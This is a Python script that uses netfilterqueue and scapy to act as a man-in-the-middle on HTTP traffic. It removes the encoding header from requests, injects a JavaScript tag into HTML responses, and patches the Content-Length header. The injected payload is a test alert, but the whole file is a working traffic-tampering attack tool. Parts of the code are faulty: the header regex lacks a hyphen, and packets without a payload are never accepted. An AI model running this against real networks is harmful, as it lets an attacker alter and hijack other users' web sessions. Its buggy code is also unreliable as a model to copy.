#!/usr/bin/env python



import netfilterqueue

import scapy.all as scapy

import re





def set_load(packet, load):

    packet[scapy.Raw].load = load

    # Remove the old lengths and checksums so that they get automatically reset by scapy

    del packet[scapy.IP].len

    del packet[scapy.IP].chksum

    del packet[scapy.TCP].chksum

    return packet

# For Python 3

def process_packet(packet):
    
    # Get the packet payload and convert it to a scapy packet to be able to inspect all layers

    scapy_packet = scapy.IP(packet.get_payload())

    # print(scapy_packet.show())
     # HTTP payload is placed within the Raw layer in scapy

    if scapy_packet.haslayer(scapy.Raw):


        try:

            load = scapy_packet[scapy.Raw].load.decode()

             # Check if the packet is going to an HTTP server

            if scapy_packet[scapy.TCP].dport == 80:
                


                print("[+] HTTP Request")

                 # Prevent the web server from encoding the html code of the webpage before sending it to

                 # the web browser and tell it to send it in plain html code instead

                 # The question mark is used to stop the search as soon as the first occurence of the searched

                 # string is found

                load = re.sub("Accept Encoding:.*?\\r\\n", "", load)

             # Check if the packet is coming from an HTTP server

            elif scapy_packet[scapy.TCP].sport == 80:

                print("[+] HTTP Response")

                 # print(scapy_packet.show())

                injection_code = "<script>alert('test');</script>"

                load = load.replace("</body>", injection_code + "</body>")

                 # This variable will only store the length itself without the text used to search for it

                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)

                if content_length_search and "text/html" in load:

                     # Group 0 contains the text "Content-Length". Group 1 contains the number itself

                    content_length = content_length_search.group(1)

                    new_content_length = int(content_length) + len(injection_code)

                    load = load.replace(content_length, str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:

                new_packet = set_load(scapy_packet, load)

                 # Store the forged response in the response packet

                packet.set_payload(bytes(new_packet))

         # Unicode characters don't need to be converted to a string

        except UnicodeDecodeError:
            pass
        packet.accept()

queue = netfilterqueue.NetfilterQueue()

# Associate the net filter queue object to the filter queue of the Linux machine

# based on the number we assigned to the queue previously

queue.bind(0, process_packet)

queue.run()

